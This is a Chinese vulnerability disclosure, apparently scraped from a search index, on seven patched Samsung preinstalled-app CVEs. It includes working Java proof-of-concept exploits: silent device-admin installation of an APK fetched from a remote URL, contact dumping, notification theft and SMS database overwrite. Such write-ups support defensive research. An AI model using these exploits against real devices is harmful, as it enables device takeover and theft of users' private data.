\u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u6f0f\u6d1e Managed Provisioning \u662f\u6240\u6709\u4e09\u661f\u8bbe\u5907\u4e0a\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c \u7528\u4e8e\u4f01\u4e1a\u8bbe\u5907\u5b9a\u5236 \u3002 \u518d\u4e00\u6b21\uff0c\u5728\u6d4b\u8bd5 Managed Provisioning \u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4ece\u516c\u5171\u76ee\u5f55\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a \u6700\u521d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u7531 AOSP \u5f00\u53d1\u7684\uff0c\u5b83\u6709\u5b89\u5168\u68c0\u67e5\u6765\u9a8c\u8bc1\u4efb\u4f55\u4ea4\u4e92\u7684\u6388\u6743\u3002\u4e09\u661f\u4fee\u6539\u4e86\u6258\u7ba1\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u6dfb\u52a0\u4e0e\u5176\u751f\u6001\u7cfb\u7edf\u548c Knox Core \u4ea4\u4e92\u6240\u9700\u7684\u529f\u80fd\u3002 \u56e0\u6b64\uff0c\u5728\u4e09\u661f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u503c\u6765\u7ed5\u8fc7\u6b64\u68c0\u67e5 com.samsung.knox.container.requestId \uff1a int intExtra = intent.getIntExtra(\"com.samsung.knox.container.requestId\", -1); if (intExtra > 0) { ProvisionLogger.logw(\"Skipping verifyActionAndCaller\"); // the bypass } else if (!verifyActionAndCaller(intent, str)) { return; } \u7528\u4e8e\u5b89\u88c5\u81ea\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e3a\u5176\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u6982\u5ff5\u8bc1\u660e \u8fd9\u4e2a\u6982\u5ff5\u8bc1\u660e\u662f\u901a\u8fc7\u590d\u5236 ProvisioningParams.Builder \u7c7b\u7684\u4ee3\u7801\u5e76\u4f20\u9012\u914d\u7f6e\u6258\u7ba1\u4f9b\u5e94\u6240\u9700\u7684\u6807\u51c6\u53c2\u6570\u6765\u6784\u5efa\u7684\uff0c\u5176\u4e2d\u5305\u62ec\uff1a \u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684 URL \u6587\u4ef6\u7684 SHA1 \u54c8\u5e0c\u503c \u5728 \u8bbe\u5907\u7ba1\u7406\u63a5\u6536\u673a \u7ec4\u4ef6\u540d\u79f0 byte[] hash = Base64.decode(\"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ\", 0); PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder() .setLocation(\"https://redacted.s3.amazonaws.com/app-release.apk\") .setPackageChecksum(hash) .setSignatureChecksum(hash); ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder() .setSkipUserConsent(true) .setDeviceAdminComponentName(new ComponentName(\"test.exampleapp\", \"test.exampleapp.MyReceiver\")) .setDeviceAdminPackageName(\"test.exampleapp\") .setProvisioningAction(\"android.app.action.PROVISION_MANAGED_DEVICE\") .setDeviceAdminDownloadInfo(infoBuiler.build()); ProvisioningParams params = builder.build(); Intent i = new Intent(\"com.android.managedprovisioning.action.RESUME_PROVISIONING\"); i.setClassName(\"com.android.managedprovisioning\", \"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity\"); i.putExtra(\"provisioningParams\", params); i.putExtra(\"com.samsung.knox.container.requestId\", 1); i.putExtra(\"com.samsung.knox.container.configType\", \"knox-do-basic\"); startActivity(i); \u6253\u5f00\u5e94\u7528\u7a0b\u5e8f\u540e\uff0c\u53d1\u751f\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a Managed Provisioning \u88ab\u8feb\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u94fe\u63a5\u4e0b\u8f7d\u6076\u610f\u5e94\u7528\u7a0b\u5e8f \u6b65\u9aa4 1 \u4e2d\u5b89\u88c5\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u88ab\u8bbe\u7f6e\u4e3a\u5177\u6709\u4efb\u610f\u6743\u9650\u7684\u8bbe\u5907\u7ba1\u7406\u5458 \u542f\u52a8\u4e86\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u8be5\u8fc7\u7a0b\u5c06\u5220\u9664\u5b89\u88c5\u5728\u540c\u4e00\u8bbe\u5907\u4e0a\u7684\u6240\u6709\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u653b\u51fb\u770b\u8d77\u6765\u662f\u8fd9\u6837\u7684\uff1a \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u6f0f\u6d1e \u5b89\u5168\u6587\u4ef6\u5939\u662f\u9884\u88c5\u5728\u4e09\u661f\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6587\u4ef6\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u62e5\u6709\u5927\u91cf\u6743\u9650\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u5728\u8bbf\u95ee \u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u7a0b\u5e8f\u4e2d \u53d1\u73b0\u7684\u6f0f\u6d1e\u6765\u62e6\u622a\u8fd9\u4e9b\u6743\u9650\uff1a \u4e00\u65e6\u653b\u51fb\u8005\u6536\u5230\u4ed6\u4eec\u53d1\u9001\u7684\u610f\u56fe\uff0c\u4ed6\u4eec\u5c31\u80fd\u591f\u62e6\u622a\u6743\u9650\u3002 \u4f5c\u4e3a PoC\uff0c\u6211\u4eec\u62e6\u622a\u4e86\u8bfb/\u5199\u8054\u7cfb\u4eba\u7684\u6743\u9650\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent i = new Intent(); i.setClassName(\"com.samsung.knox.securefolder\", \"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity\"); i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); i.setData(ContactsContract.RawContacts.CONTENT_URI); startActivityForResult(i, 0); } protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); dump(data.getData()); } private void dump(Uri uri) { Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i < cursor.getColumnCount(); i++) { if (sb.length() > 0) { sb.append(\", \"); } sb.append(cursor.getColumnName(i) + \" = \" + cursor.getString(i)); } Log.d(\"evil\", sb.toString()); } while (cursor.moveToNext()); } } SecSettings \u4e2d\u7684\u6f0f\u6d1e SecSettings \u662f\u4e09\u661f\u9884\u88c5\u7684\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u4ece UID 1000 ( system )\u8bfb\u53d6\u548c\u5199\u5165\u4efb\u610f\u6587\u4ef6\u7684\u6f0f\u6d1e\u7531\u4e24\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005 \u5728 com.sec.imsservice \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5229\u7528\u4e0d\u5b89\u5168\u7684 FileProvider \u8fd9\u4e2a\u94fe\u662f\u552f\u4e00\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5728\u5b83\u4eec\u7684 AndroidManifest.xml : \u4e2d\u6307\u5b9a\u7684\u76f8\u540c\u5171\u4eab UID android:sharedUserId=\"android.uid.system\" \u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u8bbe\u7f6e\u610f\u5473\u7740\u4e24\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u5168\u5171\u4eab\u6240\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u5f7c\u6b64\u7684\u7ec4\u4ef6\u3002SecSettings \u4e2d\u7684\u6f0f\u6d1e\u662f Google \u7684\u3002\u5b83\u5df2\u62a5\u544a\u7ed9 Android VDP\u3002\u5956\u91d1\u4e3a2000\u7f8e\u5143\u3002\u6211\u4eec\u5c06\u5728\u7b2c 2 \u90e8\u5206\u6587\u7ae0\u4e2d\u62ab\u9732\u6b64\u95ee\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u4e09\u661f DeX \u7cfb\u7edf UI \u4e2d\u7684\u6f0f\u6d1e \u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005 \u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e \uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5305\u62ec Telegram\u3001Google Docs \u6587\u4ef6\u5939\u3001\u4e09\u661f\u7535\u5b50\u90ae\u4ef6\u548c Gmail \u6536\u4ef6\u7bb1\u7684\u804a\u5929\u63cf\u8ff0\uff0c\u4ee5\u53ca\u6765\u81ea\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u901a\u77e5\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u6fc0\u6d3b\u8be5\u529f\u80fd\u5728 SD \u5361\u4e0a\u7684\u5168\u5c40\u53ef\u8bfb\u76ee\u5f55\u4e2d\u521b\u5efa\u5907\u4efd\uff1a \u7531\u4e8e\u6587\u4ef6\u5728\u521b\u5efa\u5907\u4efd\u540e\u7acb\u5373\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u6dfb\u52a0\u4e86\u521b\u5efa\u5907\u4efd\u526f\u672c\u7684\u529f\u80fd\u4ee5\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a final File root = Environment.getExternalStorageDirectory(); final File policyFile = new File(root, \"notification_policy.xml\"); final File backupCopy = new File(root, \"backup\"); Intent i = new Intent(\"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION\"); i.setClassName(\"com.samsung.desktopsystemui\", \"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver\"); i.putExtra(\"SAVE_PATH\", root.getAbsolutePath()); i.putExtra(\"SESSION_KEY\", \"not_empty\"); sendBroadcast(i); new Thread(() -> { while (true) { if(policyFile.exists()) { try { InputStream i = new FileInputStream(policyFile); OutputStream o = new FileOutputStream(backupCopy); IOUtils.copy(i, o); i.close(); o.close(); } catch (Throwable th) { throw new RuntimeException(th); } } } }).start(); TelephonyUI \u4e2d\u7684\u6f0f\u6d1e \u63a5\u6536\u5668 com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver \u88ab\u5bfc\u51fa\u3002\u5b83\u5c06\u6587\u4ef6\u4ece \u4e2d\u6307\u5b9a\u7684 URL \u4fdd\u5b58\u5230 \u4e2d\u6307\u5b9a photoring_uri \u7684\u8def\u5f84 down_file \u3002\u8fd9\u662f\u7531\u8fc7\u5ea6\u5b89\u5168\u7684 Android \u626b\u63cf\u4eea\u68c0\u6d4b\u5230\u7684\uff1a \u552f\u4e00\u7684\u8981\u6c42\u662f\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5185\u5bb9\u7c7b\u578b\u5e94\u8be5\u662f image/* or video/* \u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u540d test.mp4 \uff0cAmazon S3 \u81ea\u52a8\u6307\u5b9a video/mp4 \u54cd\u5e94\u4e2d\u7684\u5185\u5bb9\u7c7b\u578b\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Intent i = new Intent(\"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING\"); i.setClassName(\"com.samsung.android.app.telephonyui\", \"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver\"); i.putExtra(\"photoring_uri\", \"https://redacted.s3.amazonaws.com/test.mp4\"); i.putExtra(\"down_file\", dbPath.getAbsolutePath()); sendBroadcast(i); \u7ed3\u679c\uff0c\u5e26\u6709 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\u88ab\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u8986\u76d6\u3002 PhotoTable \u4e2d\u7684\u6f0f\u6d1e \u5728 PhotoTable \u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86 Intent redirection \uff0c\u5b83\u5141\u8bb8\u5bf9\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u88ab\u62e6\u622a\uff1a \u6211\u4eec\u5229\u7528\u8be5\u6f0f\u6d1e\u52ab\u6301\u4e86\u8bbf\u95ee SD \u5361\u7684\u6743\u9650\u3002\u8fd9\u662f\u6982\u5ff5\u8bc1\u660e\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); handle(getIntent()); } protected void onNewIntent(Intent intent) { super.onNewIntent(intent); handle(intent); } private void handle(Intent intent) { if(\"evil\".equals(intent.getAction())) { String uri = MediaStore.Images.Media.insertImage(getContentResolver(), Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888), \"Title_1337\", \"Description_1337\"); Log.d(\"evil\", \"Result: \" + uri); } else { Intent next = new Intent(\"evil\", MediaStore.Images.Media.EXTERNAL_CONTENT_URI); next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION); next.setClass(this, getClass()); Intent i = new Intent(); i.setClassName(\"com.android.dreams.phototable\", \"com.android.dreams.phototable.PermissionsRequestActivity\"); i.putExtra(\"previous_intent\", next); i.putExtra(\"permission_list\", new String[0]); startActivity(i); } } from \u539f\u6587\u94fe\u63a5\uff1a https://www.ddosi.org/cve-2021-25356/","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_1","text":"\u4e09\u661f\u9884\u88c5\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u4e2d\u62ab\u9732\u4e86\u591a\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\uff0c \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672a\u7ecf\u7528\u6237\u540c\u610f\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e2a\u4eba\u6570\u636e\u5e76\u63a7\u5236\u8bbe\u5907\u3002 \u201c\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u548c\u7f16\u8f91\u53d7\u5bb3\u8005\u7684\u8054\u7cfb\u4eba\u3001\u7535\u8bdd\u3001\u77ed\u4fe1/\u5f69\u4fe1\uff0c\u5b89\u88c5\u5177\u6709\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u4ee3\u8868\u7cfb\u7edf\u7528\u6237\u8bfb\u5199\u4efb\u610f\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66f4\u6539\u8bbe\u5907\u7684\u8bbe\u7f6e\uff0c\u201d\u79fb\u52a8\u5b89\u5168\u521d\u521b\u516c\u53f8 Oversecured \u7684\u521b\u59cb\u4eba Sergey Toshin\u5728\u5468\u56db\u53d1\u5e03\u7684\u4e00\u4efd\u5206\u6790\u62a5\u544a\u4e2d \u8868\u793a \u3002 Toshin \u4e8e 2021 \u5e74 2 \u6708\u5411\u4e09\u661f\u62a5\u544a\u4e86\u8fd9\u4e9b\u7f3a\u9677\uff0c\u968f\u540e\u5236\u9020\u5546 \u53d1\u5e03 \u4e86 \u8865\u4e01\uff0c \u4f5c\u4e3a\u5176 4 \u6708\u548c 5 \u6708\u7684\u6708\u5ea6\u5b89\u5168\u66f4\u65b0\u7684\u4e00\u90e8\u5206\u3002","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_2","text":"CVE-2021-25356 \u2013 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u7b2c\u4e09\u65b9\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-25388 \u2013 Knox Core \u4e2d\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u6f0f\u6d1e CVE-2021-25390 \u2013 PhotoTable \u4e2d\u7684 \u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25391 \u2013 \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25392 \u2013 \u53ef\u4ee5\u8bbf\u95ee DeX \u7684 \u901a\u77e5\u7b56\u7565\u6587\u4ef6 CVE-2021-25393 \u2013 \u53ef\u4ee5\u4f5c\u4e3a\u7cfb\u7edf\u7528\u6237\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee\uff08\u5f71\u54cd\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff09 CVE-2021-25397 \u2013 TelephonyUI \u4e2d\u7684 \u4efb\u610f\u6587\u4ef6\u5199\u5165 \u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u610f\u5473\u7740\u5b83\u4eec\u53ef\u80fd\u88ab\u5229\u7528\u6765\u5b89\u88c5\u4efb\u610f\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3001\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u5220\u9664\u5176\u4ed6\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7a83\u53d6\u654f\u611f\u6587\u4ef6\u3001\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\u8bfb\u53d6\u6216\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u751a\u81f3\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002 \u5728\u6982\u5ff5\u9a8c\u8bc1 (PoC) \u6f14\u793a\u4e2d\uff0cOversecured \u786e\u5b9a\u53ef\u4ee5\u5229\u7528 PhotoTable \u548c Secure Folder \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411\u7f3a\u9677\u6765\u52ab\u6301\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee SD \u5361\u548c\u8bfb\u53d6\u5b58\u50a8\u5728\u624b\u673a\u4e2d\u7684\u8054\u7cfb\u4eba\u7684\u6743\u9650\u3002\u540c\u6837\uff0c\u901a\u8fc7\u5229\u7528 CVE-2021-25397 \u548c CVE-2021-25392\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u6076\u610f\u5185\u5bb9\u8986\u76d6\u5b58\u50a8 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\uff0c\u5e76\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\u3002 \u5efa\u8bae\u4e09\u661f\u8bbe\u5907\u6240\u6709\u8005\u5e94\u7528\u8be5\u516c\u53f8\u7684\u6700\u65b0\u56fa\u4ef6\u66f4\u65b0\uff0c\u4ee5\u907f\u514d\u4efb\u4f55\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002","title":"\u4e03\u4e2a\u6f0f\u6d1e\u5217\u8868\u5982\u4e0b:"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_3","text":"\u8fd9\u4e9b \u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u8fdd\u53cd GDPR \uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u80fd\u591f\u5e2e\u52a9\u4e09\u661f\u53ca\u65f6\u8bc6\u522b\u548c\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u3002 \u5982\u679c\u60a8\u662f\u5f00\u53d1\u4eba\u5458\u6216\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\uff0c\u60a8\u53ef\u4ee5\u5c06 Oversecured \u96c6\u6210\u5230\u60a8\u7684 CI/CD \u4e2d\uff0c\u4ee5\u4e3b\u52a8\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fb5\u5bb3\u3002 CI/CD \u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u63d2\u4ef6\u5b8c\u5168\u81ea\u52a8\u5316\u3002\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u5c06\u6301\u7eed\u76d1\u63a7\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5728\u68c0\u6d4b\u5230\u4efb\u4f55\u65b0\u6f0f\u6d1e\u65f6\u63d0\u9192\u60a8\u3002 \u4ece Quick Start \u5f00\u59cb\u8bd5\u7528\uff0c\u5f00\u59cb\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u60a8\u53ef\u4ee5 \u5728\u6b64\u5904 \u8054\u7cfb\u6211\u4eec\u4ee5\u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u5e76\u83b7\u53d6\u6f14\u793a\u3002 \u5982\u679c\u60a8\u662f\u4e00\u540d\u5b89\u5168\u7814\u7a76\u4eba\u5458\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 Oversecured \u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u626b\u63cf\u5668\u626b\u63cf\u8fd9\u4e9b\u9519\u8bef\uff0c\u4ece\u800c\u81ea\u52a8\u6267\u884c\u9519\u8bef\u68c0\u6d4b\u8fc7\u7a0b\u3002\u60a8\u6240\u8981\u505a\u7684\u5c31\u662f \u6ce8\u518c \u5e76\u4e0a\u4f20\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u626b\u63cf\u4eea\u5c06\u8d1f\u8d23\u5176\u4f59\u7684\u5de5\u4f5c\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_4","text":"CVE SVE \u53d7\u5f71\u54cd\u7684\u5e94\u7528 \u63cf\u8ff0 \u5956\u52b1\u91d1\u989d CVE-2021-25388 SVE-2021-20636 Knox Core (com.samsung.android.knox.containercore) \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u548c\u8bbe\u5907\u8303\u56f4\u5185\u7684\u4efb\u610f\u6587\u4ef6\u76d7\u7a83 1720 \u7f8e\u5143 CVE-2021-25356 SVE-2021-20733 \u6258\u7ba1\u914d\u7f6e (com.android.managedprovisioning) \u5b89\u88c5\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u5e76\u6388\u4e88\u4ed6\u4eec\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650 7000 \u7f8e\u5143 CVE-2021-25391 SVE-2021-20500 \u5b89\u5168\u6587\u4ef6\u5939 (com.samsung.knox.securefolder) \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u5546 1050 \u7f8e\u5143 CVE-2021-25393 SVE-2021-20731 SecSettings (com.android.settings) \u83b7\u5f97\u5bf9\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u6743\u9650\u5bfc\u81f4\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\uff08UID 1000\uff09\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee 5460 \u7f8e\u5143 CVE-2021-25392 SVE-2021-20690 \u4e09\u661f DeX \u7cfb\u7edf UI (com.samsung.desktopsystemui) \u80fd\u591f\u7a83\u53d6\u901a\u77e5\u7b56\u7565\u914d\u7f6e 330 \u7f8e\u5143 CVE-2021-25397 SVE-2021-20716 TelephonyUI (com.samsung.android.app.telephonyui) \uff08\u8986\u76d6\uff09\u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5165\u4e3a UID 1001 4850 \u7f8e\u5143 CVE-2021-25390 SVE-2021-20724 PhotoTable (com.android.dreams.phototable) \u610f\u56fe\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bbf\u95ee\u4efb\u610f\u5185\u5bb9\u63d0\u4f9b\u8005 280 \u7f8e\u5143","title":"\u6f0f\u6d1e\u8be6\u60c5\u5217\u8868\uff1a"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#knox-core","text":"\u9996\u5148\uff0c\u6211\u4eec\u626b\u63cf\u4e86 Knox Core \u5e94\u7528\u7a0b\u5e8f\uff0c\u53d1\u73b0\u4ece SD \u5361\u5b89\u88c5\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a \u4e8b\u5b9e\u8bc1\u660e\uff0c\u6b64\u529f\u80fd\u662f\u901a\u8fc7\u5bfc\u51fa\u7684\u670d\u52a1\u6fc0\u6d3b\u7684 com.samsung.android.knox.containercore.provisioning.DualDARInitService \uff1a <service android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\" android:exported=\"true\"> <intent-filter> <action android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"/> </intent-filter> </service> \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 dualdar-config-client-location \u53c2\u6570\u4f20\u9012\u4efb\u610f URI\uff0c\u8be5\u53c2\u6570\u5c06\u88ab\u590d\u5236\u5230 /sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk \uff0c\u8fd9\u662f\u4e00\u4e2a\u4e16\u754c\u53ef\u8bfb\u7684\u4f4d\u7f6e\u3002 \u4e4b\u540e\uff0c\u5c06\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u8fc7\u7a0b\uff1a private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) { if (intent.getBooleanExtra(\"DUAL_DAR_IS_WPCOD\", false)) { int intExtra = intent.getIntExtra(\"android.intent.extra.user_handle\", UserHandle.myUserId()); Bundle bundleExtra = intent.getBundleExtra(\"DUAL_DAR_PARAMS\"); String string = bundleExtra.getString(\"dualdar-config-client-package\", null); if (!TextUtils.isEmpty(string)) { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto\"); String string2 = bundleExtra.getString(\"dualdar-config-client-location\"); // attacker-controlled URI DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = \" + string2); if (TextUtils.isEmpty(string2)) { notifyMPError(5); } else if (string2.startsWith(\"file://\")) { String str = getExternalFilesDir(null) + \"/client_downloaded_knox_app.apk\"; try { // attacker-controlled file is copied to the public location ((SemRemoteContentManager) this.mContext.getSystemService(\"rcp\")).copyFile(intExtra, string2.replaceFirst(\"^file://\", \"\"), intExtra, str); installPackageTask(intent, string, str); // and then installed } catch (RemoteException unused) { DDLog.m3e(\"KNOXCORE::DualDARInitService\", \"copyFile failed.\"); notifyMPError(5); } } else if (string2.startsWith(\"https://\")) { downloadPackageTask(intent, string, string2); } else { 